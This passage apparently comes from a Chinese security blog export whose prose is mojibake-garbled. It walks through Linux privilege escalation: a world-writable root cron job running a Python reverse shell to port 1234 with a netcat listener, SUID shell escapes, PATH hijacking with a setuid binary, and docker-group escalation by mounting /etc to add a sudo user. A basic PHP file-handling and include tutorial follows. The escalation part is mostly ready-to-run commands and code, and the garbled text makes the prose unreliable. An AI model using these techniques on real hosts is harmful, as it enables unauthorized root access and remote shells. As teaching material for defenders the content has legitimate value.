<li>è§£å†³æ–¹æ³•ï¼šä½¿ç”¨pythonåŠ è½½ä¸€ä¸ªpty<ul>
<li><code>python -c &#39;import pty;pty.spawn(&quot;/bin/sh&quot;)&#39;</code></li>
</ul>
</li>
<li>â–² è½¬æ¢ä¸ºäº¤äº’å¼shellä»¥åŠç»ˆç«¯å‹shellçš„æ–¹æ³•è¿˜æœ‰å¾ˆå¤šï¼Œpythonæ˜¯æœ€ç®€å•ä¸€ç§ï¼Œä½†éœ€è¦pythonç¯å¢ƒæ‰å¯ä»¥æ‰§è¡Œè½¬æ¢</li>
</ul>
<p><img src="/images/privilge/linux-su-sudo.PNG" alt="linux-su-sudo"></p>
<h3 id="0X04-è®¡åˆ’ä»»åŠ¡"><a href="#0X04-è®¡åˆ’ä»»åŠ¡" class="headerlink" title="0X04 è®¡åˆ’ä»»åŠ¡"></a>0X04 è®¡åˆ’ä»»åŠ¡</h3><ul>
<li>ç³»ç»Ÿå†…å¯èƒ½ä¼šæœ‰ä¸€äº›å®šæ—¶æ‰§è¡Œçš„ä»»åŠ¡ï¼Œä¸€èˆ¬è¿™äº›ä»»åŠ¡ç”±crontabæ¥ç®¡ç†ï¼Œå…·æœ‰æ‰€å±ç”¨æˆ·çš„æƒé™</li>
<li>å‰æ<ul>
<li>å¯åˆ—å‡º/etcå†…ç³»ç»Ÿçš„è®¡åˆ’ä»»åŠ¡</li>
<li>ç¨‹åºé»˜è®¤æ˜¯ä»¥rootæƒé™æ‰§è¡Œ</li>
<li>å…¶ä¸­ä¸€ä¸ªè„šæœ¬é…ç½®æˆä»»æ„ç”¨æˆ·å¯å†™</li>
</ul>
</li>
</ul>
<p><img src="/images/privilge/linux-cron-root.png" alt="linux-cron-root"></p>
<ul>
<li>ä¿®æ”¹è„šæœ¬ä¸ºè‡ªå·±æ‰§è¡Œçš„å†…å®¹ /etc/cron.d/py_reverse_shell<ul>
<li>è„šæœ¬çš„æ„æ€ä¸ºï¼Œæ¯ä¸¤åˆ†é’Ÿrootç”¨æˆ·æ‰§è¡Œä¸€æ¬¡testç›®å½•ä¸‹çš„pythonè„šæœ¬</li>
</ul>
</li>
</ul>
<p><code>*/2 * * * * root python3.8 /home/test/py_reverse_shell.py</code></p>
<p><img src="/images/privilge/linux-crond.png" alt="linux-crond"></p>
<ul>
<li>py_reverse_shell.pyï¼Œå¸¸ç”¨çš„pythonåå¼¹shçš„shell</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"127.0.0.1"</span>,<span class="number">1234</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>])</span><br></pre></td></tr></table></figure>

<p><img src="/images/privilge/linux-reverse-py.jpg" alt="linux-reverse-py"></p>
<ul>
<li>ä½¿ç”¨ä½æƒé™çš„ç”¨æˆ·å¼€å¯ncç›‘å¬ç«¯å£ï¼Œ2åˆ†é’Ÿåå³å¯è·å–åˆ°rootçš„shçš„shell</li>
</ul>
<p><img src="/images/privilge/linux-cron-reverse-nc.png" alt="linux-cron-reverse-nc"></p>
<h3 id="0X05-SUIDææƒ"><a href="#0X05-SUIDææƒ" class="headerlink" title="0X05 SUIDææƒ"></a>0X05 SUIDææƒ</h3><ul>
<li>æ¦‚è¦<ul>
<li>SUIDæ˜¯ä¸€ç§ç‰¹æ®Šçš„æ–‡ä»¶å±æ€§ï¼Œå®ƒå…è®¸ç”¨æˆ·æ‰§è¡Œçš„æ–‡ä»¶ä»¥è¯¥æ–‡ä»¶çš„æ‹¥æœ‰è€…çš„èº«ä»½è¿è¡Œ</li>
</ul>
</li>
<li>æ–‡ä»¶æƒé™å‘½ä»¤<ul>
<li>SUIDï¼šchmod u+s file</li>
</ul>
</li>
<li>æŸ¥çœ‹SUIDæ–‡ä»¶<ul>
<li>find / -user root -perm -4000 -print 2&gt;/dev/null</li>
<li>find / -perm -u=s -type f 2&gt;/dev/null</li>
</ul>
</li>
</ul>
<h5 id="findå‘½ä»¤"><a href="#findå‘½ä»¤" class="headerlink" title="findå‘½ä»¤"></a>findå‘½ä»¤</h5><ul>
<li><code>find examples.desktop exec whoami \;</code><ul>
<li>â–² å¦‚æœæœ‰pythonç¯å¢ƒï¼Œåˆ™å¯ä»¥ç›´æ¥pythonåå¼¹å‘½ä»¤</li>
</ul>
</li>
</ul>
<p><img src="/images/privilge/linux-suid-find.PNG" alt="linux-suid-find"></p>
<h5 id="å…¶ä»–SUIDæƒé™å‘½ä»¤"><a href="#å…¶ä»–SUIDæƒé™å‘½ä»¤" class="headerlink" title="å…¶ä»–SUIDæƒé™å‘½ä»¤"></a>å…¶ä»–SUIDæƒé™å‘½ä»¤</h5><ul>
<li>bash<ul>
<li>bash -p</li>
</ul>
</li>
<li>less<ul>
<li>less /etc/passwd</li>
<li>!/bin/sh</li>
</ul>
</li>
<li>awk<ul>
<li>awk â€˜BEGIN {system(â€œ/bin/bash -pâ€)}â€™</li>
</ul>
</li>
<li>csh<ul>
<li>csh -b</li>
</ul>
</li>
<li>dmesg<ul>
<li>dmesg -H</li>
<li>!/bin/sh -p</li>
</ul>
</li>
<li>man<ul>
<li>man man </li>
<li>!/bin/sh -p</li>
</ul>
</li>
<li>more<ul>
<li>more /etc/profile</li>
<li>!/bin/sh -p</li>
</ul>
</li>
<li>â–² å…·æœ‰SUIDæƒé™çš„å‘½ä»¤æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æœ‰å¾ˆå¤šï¼Œè¯¦ç»†è§å‚è€ƒé“¾æ¥çš„æ–‡ç« </li>
</ul>
<h3 id="0X06-åŠ«æŒç¯å¢ƒå˜é‡è¿›è¡Œææƒ"><a href="#0X06-åŠ«æŒç¯å¢ƒå˜é‡è¿›è¡Œææƒ" class="headerlink" title="0X06 åŠ«æŒç¯å¢ƒå˜é‡è¿›è¡Œææƒ"></a>0X06 åŠ«æŒç¯å¢ƒå˜é‡è¿›è¡Œææƒ</h3><ul>
<li>æ¦‚è¦<ul>
<li>PATHæ˜¯Linuxå’Œç±»Unixæ“ä½œç³»ç»Ÿä¸­çš„ç¯å¢ƒå˜é‡ï¼Œå®ƒæŒ‡å®šå­˜å‚¨å¯æ‰§è¡Œç¨‹åºçš„binå’Œsbinç›®å½•</li>
<li>å½“ç”¨æˆ·åœ¨ç»ˆç«¯ä¸Šæ‰§è¡Œä»»ä½•å‘½ä»¤æ—¶ï¼Œå®ƒä¼šé€šè¿‡PATHå˜é‡æ¥å“åº”ç”¨æˆ·æ‰§è¡Œçš„å‘½ä»¤ï¼Œå¹¶å‘shellå‘é€è¯·æ±‚ä»¥æœç´¢å¯æ‰§è¡Œæ–‡ä»¶</li>
</ul>
</li>
<li>æŸ¥çœ‹å½“å‰PATHç¯å¢ƒå˜é‡ï¼š<code>echo $PATH</code><ul>
<li><code>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</code></li>
</ul>
</li>
<li>å‰æ<ul>
<li>å¯ä»¥æ“ä½œçš„PATHç¯å¢ƒå˜é‡</li>
<li>å…·æœ‰suidæƒé™çš„è„šæœ¬æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å¦‚<code>ps</code>ï¼Œ<code>id</code>ç­‰</li>
</ul>
</li>
<li>æµ‹è¯•</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">******************ç¬¬ä¸€æ­¥************  rootç”¨æˆ·æˆ–è€…é«˜æƒé™ç”¨æˆ·</span><br><span class="line"><span class="built_in">cd</span> /home/tomas</span><br><span class="line">vi demo.c</span><br><span class="line">    <span class="comment">#include&lt;unistd.h&gt;</span></span><br><span class="line">    void main()</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">"ps"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">gcc demo.c -o shell</span><br><span class="line">chmod u+s shell</span><br><span class="line"></span><br><span class="line">******************ç¬¬äºŒæ­¥************  ä½æƒé™ç”¨æˆ·</span><br><span class="line">ECHOå‘½ä»¤ï¼š</span><br><span class="line">    <span class="built_in">cd</span> /tmp</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"/bin/bash"</span> &gt; ps</span><br><span class="line">    chmod 777 ps</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">    <span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line">    <span class="built_in">cd</span> /home/tomas</span><br><span class="line">    ./shell</span><br><span class="line">    whoami</span><br><span class="line">COPYå‘½ä»¤ï¼š</span><br><span class="line">    <span class="built_in">cd</span> /home/tomas</span><br><span class="line">    cp /bin/bash</span><br><span class="line">    sh /tmp/ps</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">    <span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line">    ./shell</span><br><span class="line">    whoami</span><br><span class="line">SYMLINKå‘½ä»¤ï¼š</span><br><span class="line">    ln -s /bin/sh ps</span><br><span class="line">    <span class="built_in">export</span> PATH=.:<span class="variable">$PATH</span></span><br><span class="line">    ./shell</span><br><span class="line">    id</span><br><span class="line">    whoami</span><br></pre></td></tr></table></figure>

<p><img src="/images/privilge/linux-path-echo.PNG" alt="linux-path-echo"></p>
<p><img src="/images/privilge/linux-path-copy.PNG" alt="linux-path-copy"></p>
<p><img src="/images/privilge/linux-path-symlink.PNG" alt="linux-path-symlink">   </p>
<h3 id="0X07-dockerç»„ææƒ"><a href="#0X07-dockerç»„ææƒ" class="headerlink" title="0X07 dockerç»„ææƒ"></a>0X07 dockerç»„ææƒ</h3><h5 id="dockerç»„æˆå‘˜è¿è¡Œdocker"><a href="#dockerç»„æˆå‘˜è¿è¡Œdocker" class="headerlink" title="dockerç»„æˆå‘˜è¿è¡Œdocker"></a>dockerç»„æˆå‘˜è¿è¡Œdocker</h5><ul>
<li>é»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨dockerå¿…é¡»è¦æœ‰sudoæƒé™</li>
<li>åªéœ€è¦ç®¡ç†å‘˜å°†éœ€è¦ä½¿ç”¨dockerçš„ç”¨æˆ·æ·»åŠ åˆ°dockerç”¨æˆ·ç»„ä¸­ï¼Œç”¨æˆ·é‡æ–°ç™»å½•æœºå™¨å³å¯å…sudoä½¿ç”¨dockeräº†</li>
</ul>
<h5 id="dockerå®¹å™¨å†…ç”¨æˆ·æƒé™ä¸ºroot"><a href="#dockerå®¹å™¨å†…ç”¨æˆ·æƒé™ä¸ºroot" class="headerlink" title="dockerå®¹å™¨å†…ç”¨æˆ·æƒé™ä¸ºroot"></a>dockerå®¹å™¨å†…ç”¨æˆ·æƒé™ä¸ºroot</h5><ul>
<li>ç”¨æˆ·åˆ›å»ºä¸€ä¸ªdockerå®¹å™¨åï¼Œå®¹å™¨å†…é»˜è®¤æ˜¯rootè´¦æˆ·ï¼Œåœ¨ä¸éœ€è¦åŠ sudoçš„æƒ…å†µä¸‹å¯ä»¥ä»»æ„æ›´æ”¹å®¹å™¨å†…çš„é…ç½®</li>
</ul>
<h5 id="dockeræ–‡ä»¶æ˜ å°„æ–¹ä¾¿å®¹å™¨å†…å¤–æ–‡ä»¶å…±äº«"><a href="#dockeræ–‡ä»¶æ˜ å°„æ–¹ä¾¿å®¹å™¨å†…å¤–æ–‡ä»¶å…±äº«" class="headerlink" title="dockeræ–‡ä»¶æ˜ å°„æ–¹ä¾¿å®¹å™¨å†…å¤–æ–‡ä»¶å…±äº«"></a>dockeræ–‡ä»¶æ˜ å°„æ–¹ä¾¿å®¹å™¨å†…å¤–æ–‡ä»¶å…±äº«</h5><ul>
<li>dockeræä¾›äº†ä¸€ä¸ª-vé€‰é¡¹ï¼Œæä¾›ç”¨æˆ·å°†å®¹å™¨å¤–çš„hostç›®å½•æ˜ å°„è¿›å®¹å™¨å†…ï¼Œæ–¹ä¾¿çš„è¿›è¡Œå®¹å™¨å†…å¤–çš„æ–‡ä»¶å…±äº«</li>
</ul>
<h5 id="dockerææƒæ­¥éª¤"><a href="#dockerææƒæ­¥éª¤" class="headerlink" title="dockerææƒæ­¥éª¤"></a>dockerææƒæ­¥éª¤</h5><ul>
<li>åœ¨dockerç»„çš„ç”¨æˆ·ï¼Œä½†ä¸å…·æœ‰sudoç»„çš„æƒé™ï¼Œåˆ›å»ºä¸€ä¸ªå®¹å™¨<ul>
<li><code>docker run -it --rm -v /etc:/etc xxx /bin/bash</code>   #å¼‚å¸¸ä½¿ç”¨ï¼Œå…±äº«å¤–éƒ¨æ–‡ä»¶/etc</li>
<li><code>adduser test1</code>   # ä½¿ç”¨å®¹å™¨å†…çš„rootæƒé™åˆ›å»ºä¸€ä¸ªtest1ç”¨æˆ·</li>
<li><code>usermod -aG sudo test1</code>  # å°†è¯¥ç”¨æˆ·èµ‹äºˆsudoæƒé™</li>
</ul>
</li>
<li>è¿›è¡Œææƒ<ul>
<li><code>Ctrl+D</code>  # é€€å‡ºå®¹å™¨åˆ°host</li>
<li><code>cat /etc/passwd</code>  # å‘ç°æ–°å¢äº†ç”¨æˆ·test1</li>
<li><code>su test1</code>  # åˆ‡æ¢ç”¨æˆ·åˆ°test1ç”¨æˆ·</li>
<li><code>groups</code> # å‘ç°test1ç”¨æˆ·å…·æœ‰sudoç»„çš„æƒé™</li>
</ul>
</li>
</ul>
<p><img src="/images/privilge/linux-docker.PNG" alt="linux-docker"></p>
<h5 id="è§„é¿æªæ–½"><a href="#è§„é¿æªæ–½" class="headerlink" title="è§„é¿æªæ–½"></a>è§„é¿æªæ–½</h5><ul>
<li>å¯¹äºå¤šä¸ªç”¨æˆ·æƒ³ä½¿ç”¨å®¹å™¨ï¼Œå¯ä»¥é€šè¿‡ç®¡ç†å‘˜é›†ä¸­åˆ›å»ºå¼€å¯äº†sshæœåŠ¡çš„å®¹å™¨ï¼Œå¹¶æä¾›ç«¯å£æ˜ å°„åˆ°hostä¸Šï¼Œè®©æ™®é€šç”¨æˆ·é€šè¿‡sshé“¾æ¥è¿›å…¥å®¹å™¨ï¼Œè¿™æ ·å°±å¯ä»¥é™åˆ¶æ™®é€šç”¨æˆ·çš„æ´»åŠ¨èŒƒå›´åœ¨å®¹å™¨å†…ï¼Œç”¨æˆ·çš„ä»»æ„æ“ä½œä¹Ÿä¸ä¼šæ‰©æ•£åˆ°hostä¸Š</li>
</ul>
<h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><ul>
<li><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/" target="_blank" rel="noopener">Linux Privilege Escalation Using PATH Variable</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=2651091670&idx=3&sn=8df01e482e3cad5bec29128d389ead37&chksm=bd1fe05d8a68694b336fb948e0de833b1b1e7bb25a228e3f188d8762276020f304b6f2491b8a&mpshare=1&scene=1&srcid=0805vnaZrUzFk6iQSVhath1O&sharer_sharetime=1596588256066&sharer_shareid=13de7cf246df94cfb693d05988b76aac&key=b21c8bfc2e98d5d8b23ded436e6d4de1d3d39a65f3a44305a57fc5c39817fbccfbdd7702789cf712dadec58c1640ba161271d86c2d8558039af171b9655d4b152861679b0e57297b461c7bd55945f29b&ascene=1&uin=MjYzNzU1MTExOQ%3D%3D&devicetype=Windows+10+x64&version=62090529&lang=zh_CN&exportkey=AyyflVNz0ZmoNq26aIJSHWs%3D&pass_ticket=9ZbiqJaZM%2BTSww8n%2B5NlblNhuTskf5FAtm2QvX0VLMI9Y05ZlZsRDqPhkMS40B5u" target="_blank" rel="noopener">CentOS 7ç³»ç»Ÿåˆ©ç”¨suidææƒè·å–Root Shell</a></li>
<li><a href="https://www.freebuf.com/articles/system/173903.html" target="_blank" rel="noopener">åœ¨Linuxä¸­ä½¿ç”¨ç¯å¢ƒå˜é‡è¿›è¡Œææƒ</a></li>
<li><a href="https://www.cnblogs.com/BOHB-yunying/articles/11517748.html" target="_blank" rel="noopener">Linuxå¸¸è§ææƒ</a></li>
<li><a href="https://www.freebuf.com/articles/system/170783.html" target="_blank" rel="noopener">æ™®é€šç”¨æˆ·å€ŸåŠ©Dockerå®¹å™¨ææƒæ€è·¯åˆ†äº«</a></li>
<li><a href="https://cloud.tencent.com/developer/article/1544037" target="_blank" rel="noopener">Linux ææƒçš„å„ç§å§¿åŠ¿æ€»ç»“</a></li>
<li><a href="https://cloud.tencent.com/developer/article/1547098" target="_blank" rel="noopener">ææƒæ€»ç»“ä»¥åŠå„ç§åˆ©ç”¨å§¿åŠ¿</a></li>
</ul>
]]></content>
      <categories>
        <category>Privilge</category>
      </categories>
  </entry>
  <entry>
    <title>phpæ–‡ä»¶ç›¸å…³æ“ä½œ</title>
    <url>/2020/07/12/php_file_about/</url>
    <content><![CDATA[<hr>
<h2 id="phpæ–‡ä»¶ç›¸å…³æ“ä½œ"><a href="#phpæ–‡ä»¶ç›¸å…³æ“ä½œ" class="headerlink" title="phpæ–‡ä»¶ç›¸å…³æ“ä½œ"></a>phpæ–‡ä»¶ç›¸å…³æ“ä½œ</h2><ul>
<li>æ–‡ä»¶æ“ä½œ</li>
<li>æ–‡ä»¶åŒ…å«<ul>
<li>æ–‡ä»¶åŒ…å«å½¢å¼</li>
<li>åŒºåˆ«</li>
<li>æ–‡ä»¶åŠ è½½åŸç†</li>
<li>æ–‡ä»¶åŠ è½½è·¯å¾„</li>
<li>æ–‡ä»¶åµŒå¥—åŒ…å«</li>
</ul>
</li>
<li>æ–‡ä»¶ä¸Šä¼ <ul>
<li>é…ç½®php.ini</li>
<li>æ–°å»ºä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ </li>
</ul>
</li>
</ul>
<h3 id="0X00-æ–‡ä»¶æ“ä½œ"><a href="#0X00-æ–‡ä»¶æ“ä½œ" class="headerlink" title="0X00 æ–‡ä»¶æ“ä½œ"></a>0X00 æ–‡ä»¶æ“ä½œ</h3><ul>
<li>fopen() çš„ç¬¬ä¸€ä¸ªå‚æ•°åŒ…å«è¢«æ‰“å¼€çš„æ–‡ä»¶åï¼Œç¬¬äºŒä¸ªå‚æ•°è§„å®šæ‰“å¼€æ–‡ä»¶çš„æ¨¡å¼ã€‚<ul>
<li>$myfile = fopen(â€œwebdictionary.txtâ€, â€œrâ€) or die(â€œUnable to open file!â€);</li>
</ul>
</li>
<li>è¯»æ–‡ä»¶<ul>
<li>Fgets($find) //è¯»ç¬¬ä¸€è¡Œæ–‡ä»¶<ul>
<li>â–² æ–‡ä»¶æŒ‡é’ˆå¿…é¡»æ˜¯æœ‰æ•ˆçš„ï¼Œå¿…é¡»æŒ‡å‘ç”± fopen()æˆ–fsockopen()æˆåŠŸæ‰“å¼€çš„æ–‡ä»¶(å¹¶è¿˜æœªç”± fclose() å…³é—­)ã€‚</li>
<li>â–² fget()å¯ä»¥è¢«ç”¨æ¥æ¨¡æ‹Ÿget/postè¯·æ±‚ï¼Œç»“åˆfopen()å’Œfsockopen()ä¸¤ä¸ªå‡½æ•°</li>
</ul>
</li>
<li>Fread($find,è·å–å­—èŠ‚) //æŒ‡å®šè·å–å†…å®¹</li>
<li>Filesize($find) //è·å–æ–‡ä»¶å­—èŠ‚<ul>
<li>â–² $find å¿…é¡»ä¸ºè·¯å¾„</li>
</ul>
</li>
<li>Fclose($find) //å…³é—­èµ„æº</li>
</ul>
</li>
<li>ä¿®æ”¹æˆ–æ·»åŠ æ–‡ä»¶å†…å®¹<ul>
<li>Fopen(./1.xx,â€a+â€);</li>
<li>Fwrite(â€œæ–‡ä»¶â€,â€å†…å®¹â€);<ul>
<li>â–² åªèƒ½å°†å­—ç¬¦ä¸²stringå†™è¿›æ–‡ä»¶ï¼Œæ— æ³•å°†æ•°ç»„å†™è¿›</li>
<li>â–² å†™è¿›æ•°ç»„å¯å€Ÿç”¨file_put_contents()å‡½æ•°</li>
</ul>
</li>
<li>Fclose(find);  //å…³é—­èµ„æº</li>
</ul>
</li>
<li>æ–‡ä»¶æŒ‡é’ˆfeof()<ul>
<li>â–² æ–‡ä»¶æŒ‡é’ˆå¿…é¡»æ˜¯æœ‰æ•ˆçš„ï¼Œå¿…é¡»æŒ‡å‘ç”± fopen()æˆ–fsockopen()æˆåŠŸæ‰“å¼€çš„æ–‡ä»¶ï¼ˆå¹¶è¿˜æœªç”± fclose()å…³é—­ï¼‰</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    //è¯»æ–‡ä»¶</span><br><span class="line">    $f = fopen(&quot;./1.txt&quot;, &quot;a+&quot;);</span><br><span class="line"></span><br><span class="line">    echo Fgets($f);  //è¯»ç¬¬ä¸€è¡Œæ–‡ä»¶</span><br><span class="line">    echo Fgets($f);  //è¯»ç¬¬äºŒè¡Œæ–‡ä»¶</span><br><span class="line">    echo Fread($f,2);  //è·å–æ–‡ä»¶å‰ä¸¤ä¸ªå­—ç¬¦</span><br><span class="line"></span><br><span class="line">    echo Filesize($f);  //è·å–å±‹å†…æŒ‰æ€»çš„å­—ç¬¦æ•°</span><br><span class="line">    echo Fread($f,Filesize(&apos;./1.html&apos;));  //è¾“å‡º1.htmlä¸­çš„æ‰€æœ‰å†…å®¹</span><br><span class="line"></span><br><span class="line">    Fclose($f);  //å…³é—­æ–‡ä»¶</span><br><span class="line">    echo Fread($f,2);  //æ— æ³•è¯»å–åˆ°æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">    //è¯»å†™æ–‡ä»¶</span><br><span class="line">    $f = fopen(&quot;./1.txt&quot;, &quot;a+&quot;);</span><br><span class="line"></span><br><span class="line">    Fwrite($f,&apos;aaaaaa&apos;)  //åœ¨æ–‡ä»¶æœ€åæ·»åŠ aaaaaa</span><br><span class="line">    Fclose($f);</span><br><span class="line"></span><br><span class="line">    $f = fopen(&quot;./1.txt&quot;, &quot;w&quot;);</span><br><span class="line"></span><br><span class="line">    Fwrite($f,&apos;aaaaaa&apos;)  //åˆ é™¤æ–‡ä»¶ï¼Œå¹¶åœ¨æ–‡ä»¶å¼€å¤´æ·»åŠ aaaaaa</span><br><span class="line">    Fclose($f);</span><br><span class="line"></span><br><span class="line">    //è·¯å¾„æ‹¼æ¥</span><br><span class="line"></span><br><span class="line">    $lujing = $_SERVER[&apos;DOCUMENT_ROOT&apos;].&quot;/&quot;;</span><br><span class="line"></span><br><span class="line">    $f = fopen($lujing.&quot;123.txt&quot;,&quot;a.txt&quot;);</span><br><span class="line"></span><br><span class="line">    Fwrite($f,&apos;aaaaaa\r\n&apos;);  //å†™å…¥æˆåŠŸ</span><br><span class="line"></span><br><span class="line">    //å‘½ä»¤è¯»å–æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">    echo `dir`;  //è¯»å–ç³»ç»Ÿè·¯å¾„</span><br><span class="line"></span><br><span class="line">    echo `type d:\\1.txt`;  //è¯»å–1.txtæ–‡ä»¶ä¸­çš„å†…å®¹</span><br><span class="line"></span><br><span class="line">    //æ–‡ä»¶æŒ‡é’ˆ</span><br><span class="line"></span><br><span class="line">    $f = fopen(&quot;./1.txt&quot;, &quot;r+&quot;);</span><br><span class="line">    while(!feof($f))</span><br><span class="line">    &#123;</span><br><span class="line">        $result.= fgets($f,128);</span><br><span class="line">    &#125;</span><br><span class="line">    echo $result;  //è¾“å‡º1.txtçš„æ‰€æœ‰å†…å®¹</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0X01-æ–‡ä»¶åŒ…å«"><a href="#0X01-æ–‡ä»¶åŒ…å«" class="headerlink" title="0X01 æ–‡ä»¶åŒ…å«"></a>0X01 æ–‡ä»¶åŒ…å«</h3><h5 id="æ–‡ä»¶åŒ…å«å½¢å¼"><a href="#æ–‡ä»¶åŒ…å«å½¢å¼" class="headerlink" title="æ–‡ä»¶åŒ…å«å½¢å¼"></a>æ–‡ä»¶åŒ…å«å½¢å¼</h5><ul>
<li>å››ç§æ–‡ä»¶åŒ…å«å½¢å¼<ul>
<li>Includeï¼šåŒ…å«æ–‡ä»¶</li>
<li>Include_onceï¼šç³»ç»Ÿä¼šè‡ªåŠ¨åˆ¤æ–­æ–‡ä»¶åŒ…å«è¿‡ç¨‹ä¸­ï¼Œæ˜¯å¦å·²ç»åŒ…å«è¿‡ï¼ˆä¸€ä¸ªæ–‡ä»¶æœ€å¤šè¢«åŒ…å«ä¸€æ¬¡ï¼‰</li>
<li>Requireï¼šä¸includeç›¸åŒ</li>
<li>Require_onceï¼šä»¥include_onceç›¸åŒ</li>
</ul>
</li>
<li>å‘ä¸ŠåŒ…å«<ul>
<li>å…ˆåŒ…å«æ–‡ä»¶ï¼Œåä½¿ç”¨æ–‡ä»¶ä¸­çš„å†…å®¹  </li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//include1.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    //è¢«åŒ…å«æ–‡ä»¶</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //å®šä¹‰æ•°æ®</span><br><span class="line">    $a = 1;</span><br><span class="line">    define(&apos;PI&apos;,3.14);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//include2.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    //åŒ…å«æ–‡ä»¶ï¼šä½¿ç”¨æ•°æ®</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //åŒ…å«æ–‡ä»¶</span><br><span class="line">    include &apos;include1.php&apos;; //åŒ…å«å½“å‰æ–‡ä»¶include2.phpæ‰€åœ¨æ–‡ä»¶å¤¹ä¸‹çš„include1.php</span><br><span class="line"></span><br><span class="line">    echo $a,PI;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //å†æ¬¡åŠ è½½</span><br><span class="line">    //include &apos;include1.php&apos;;</span><br><span class="line"></span><br><span class="line">    //include_once</span><br><span class="line">    //include_once &apos;include1.php&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>å‘ä¸‹åŒ…å«<ul>
<li>å…ˆå‡†å¤‡å†…å®¹ï¼Œç„¶ååŒ…å«å¦å¤–çš„æ–‡ä»¶ï¼Œåœ¨å¦å¤–çš„æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨å½“å‰çš„å†…å®¹</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//include3.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    //å®šä¹‰æ•°æ®</span><br><span class="line"></span><br><span class="line">    $a = 10;</span><br><span class="line">    const PI = 3.14;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //åŒ…å«æ–‡ä»¶ï¼šä¸ºäº†æ˜¾ç¤ºä»¥ä¸Šæ•°æ®</span><br><span class="line">    include_once &apos;include4.php&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//include4.php</span><br><span class="line">&lt;table&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;&lt;?php echo $a;?&gt;&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&lt;?php echo PI;?&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>

<h5 id="åŒºåˆ«"><a href="#åŒºåˆ«" class="headerlink" title="åŒºåˆ«"></a>åŒºåˆ«</h5><ul>
<li>Includeå’Œinclude_once<ul>
<li>Includeç³»ç»Ÿä¼šç¢°åˆ°ä¸€æ¬¡ï¼Œæ‰§è¡Œä¸€æ¬¡ï¼›å¦‚æœå¯¹ç»Ÿä¸€ä¸ªæ–‡ä»¶è¿›è¡Œå¤šæ¬¡åŠ è½½ï¼Œé‚£ä¹ˆç³»ç»Ÿä¼šæ‰§è¡Œå¤šæ¬¡ï¼›</li>
<li>Include_onceï¼šç³»ç»Ÿç¢°åˆ°å¤šæ¬¡ï¼Œä¹Ÿåªä¼šæ‰§è¡Œä¸€æ¬¡ã€‚</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//include2.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    //åŒ…å«æ–‡ä»¶ï¼šä½¿ç”¨æ•°æ®</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //åŒ…å«æ–‡ä»¶</span><br><span class="line">    include &apos;include1.php&apos;; //åŒ…å«å½“å‰æ–‡ä»¶include2.phpæ‰€åœ¨æ–‡ä»¶å¤¹ä¸‹çš„include1.php</span><br><span class="line"></span><br><span class="line">    echo $a,PI;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //å†æ¬¡åŠ è½½</span><br><span class="line">    //include &apos;include1.php&apos;;</span><br><span class="line"></span><br><span class="line">    //include_once</span><br><span class="line">    //include_once &apos;include1.php&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>Requireå’Œinclude<ul>
